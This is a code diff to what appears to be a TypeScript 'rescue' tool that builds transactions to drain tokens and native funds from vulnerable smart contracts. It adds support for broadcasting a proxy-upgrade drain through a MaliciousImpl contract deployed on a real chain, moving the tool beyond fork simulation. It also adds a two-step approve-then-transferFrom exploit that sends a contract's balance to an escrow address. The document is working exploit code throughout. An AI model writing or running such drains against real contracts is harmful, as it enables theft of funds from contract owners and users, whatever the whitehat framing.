@@ -1131,7 +1131,20 @@ function buildMultiArgFanoutSteps(input: RescueProveInput, exposure: Exposure): 
 // generic approach.
 // ---------------------------------------------------------------------------
 
-const MALICIOUS_IMPL_ADDRESS = "0x00000000000000000000000000000000DeadC0de";
+const MALICIOUS_IMPL_ADDRESS_FORK = "0x00000000000000000000000000000000DeadC0de";
+
+// For live broadcast, we need MaliciousImpl deployed on-chain. Format same as
+// RESCUE_FLASHLOAN_RECEIVER: comma-separated chainId:address pairs.
+// e.g. RESCUE_MALICIOUS_IMPL=1:0x...,10:0x...,56:0x...
+function maliciousImplFor(chainId: number): string | null {
+  const raw = process.env.RESCUE_MALICIOUS_IMPL ?? "";
+  if (!raw) return null;
+  for (const entry of raw.split(",")) {
+    const [cid, addr] = entry.split(":");
+    if (Number(cid) === chainId && addr) return addr.toLowerCase();
+  }
+  return null;
+}
 
 // Runtime bytecode of MaliciousImpl.sol — compiled with solc 0.8.26.
 // drainAll(address[],address) selector = 0x568fbbdb
@@ -1149,12 +1162,16 @@ async function buildProxyUpgradeDrain(
   url: string,
   notes: string[],
 ): Promise<DrainStep[]> {
+  // Use on-chain deployed address if available; otherwise fork-only address.
+  const liveImpl = maliciousImplFor(input.chainId);
+  const implAddr = liveImpl ?? MALICIOUS_IMPL_ADDRESS_FORK;
+
   // Pre-flight: can the ATTACKER call upgradeTo on this proxy?
   // If it reverts, the proxy has a runtime admin guard => not attacker-drainable.
   const preflightData =
     UPGRADE_TO_SELECTOR +
     "000000000000000000000000" +
-    MALICIOUS_IMPL_ADDRESS.slice(2).toLowerCase();
+    implAddr.slice(2).toLowerCase();
   try {
     await rpcRequest(url, "eth_call", [
       { from: ATTACKER_ADDRESS, to: input.contractAddress, data: preflightData },
@@ -1168,14 +1185,14 @@ async function buildProxyUpgradeDrain(
     return [];
   }
 
-  // Inject the MaliciousImpl bytecode at the deterministic address.
-  await rpcRequest(url, "anvil_setCode", [MALICIOUS_IMPL_ADDRESS, MALICIOUS_IMPL_BYTECODE]);
+  // Inject the MaliciousImpl bytecode at the target address on the fork.
+  await rpcRequest(url, "anvil_setCode", [implAddr, MALICIOUS_IMPL_BYTECODE]);
 
-  // Step 1: upgradeTo(MALICIOUS_IMPL_ADDRESS) — swap the proxy's impl pointer.
+  // Step 1: upgradeTo(implAddr) — swap the proxy's impl pointer.
   const upgradeCalldata =
     UPGRADE_TO_SELECTOR +
     "000000000000000000000000" +
-    MALICIOUS_IMPL_ADDRESS.slice(2).toLowerCase();
+    implAddr.slice(2).toLowerCase();
 
   const steps: DrainStep[] = [
     {
@@ -1215,9 +1232,12 @@ async function buildProxyUpgradeDrain(
   });
 
   notes.push(
-    `v10-Proxy: injected MaliciousImpl at ${MALICIOUS_IMPL_ADDRESS} via anvil_setCode. ` +
+    `v10-Proxy: injected MaliciousImpl at ${implAddr} via anvil_setCode. ` +
       `Plan: (1) upgradeTo(maliciousImpl) from attacker EOA, (2) drainAll(${tokenAddrs.length} ` +
-      `token(s), escrow=${DEFAULT_ESCROW}). Delegatecall sweeps proxy's native + ERC-20 to escrow.`,
+      `token(s), escrow=${DEFAULT_ESCROW}). Delegatecall sweeps proxy's native + ERC-20 to escrow.` +
+      (liveImpl
+        ? ` LIVE-READY: MaliciousImpl deployed on chain ${input.chainId} at ${liveImpl}.`
+        : ` FORK-ONLY: MaliciousImpl NOT deployed on chain ${input.chainId}. Set RESCUE_MALICIOUS_IMPL=${input.chainId}:<address> for live broadcast.`),
   );
 
   return steps;
@@ -1339,6 +1359,34 @@ function buildArbitraryCallDrain(
       //      it as an exposed drain step lets external broadcasters
       //      chain it. We skip when transferFrom variant above already
       //      handles the same balance.
+
+      // (1d) TWO-STEP EXPLOIT: approve(attacker, max) + transferFrom(contract, escrow, balance)
+      //      This is the most common real-world arbitrary-call exploit pattern.
+      //      Step 1: force the contract to approve our attacker EOA for max tokens
+      //      Step 2: transferFrom the contract's balance directly to escrow
+      const approveInner = ERC20_APPROVE_SELECTOR +
+        ATTACKER_ADDRESS.slice(2).toLowerCase().padStart(64, "0") +
+        MAX_UINT256.toString(16).padStart(64, "0");
+      const cdApprove = buildDrainCalldata(selector, argTypes, hitPos, t.address, approveInner, "0");
+      if (cdApprove) {
+        push(cdApprove, `${t.symbol || "?"} (${t.address}) STEP1: approve(attacker,max)`, `${witnessTag}:approve-transferFrom`);
+        // Step 2: direct transferFrom on the token (to=token, not to=contract)
+        const tfData = ERC20_TRANSFER_FROM_SELECTOR +
+          input.contractAddress.slice(2).toLowerCase().padStart(64, "0") +
+          DEFAULT_ESCROW.slice(2).toLowerCase().padStart(64, "0") +
+          bal.toString(16).padStart(64, "0");
+        const key2 = `${t.address}|${tfData}|0`;
+        if (!seen.has(key2)) {
+          seen.add(key2);
+          steps.push({
+            to: t.address,
+            data: tfData,
+            value: "0",
+            asset: `${t.symbol || "?"} (${t.address}) STEP2: transferFrom(contract,escrow,bal)`,
+            strategy: `${witnessTag}:approve-transferFrom`,
+          });
+        }
+      }
     }
 
     // -- native drain candidates --------------------------------------------
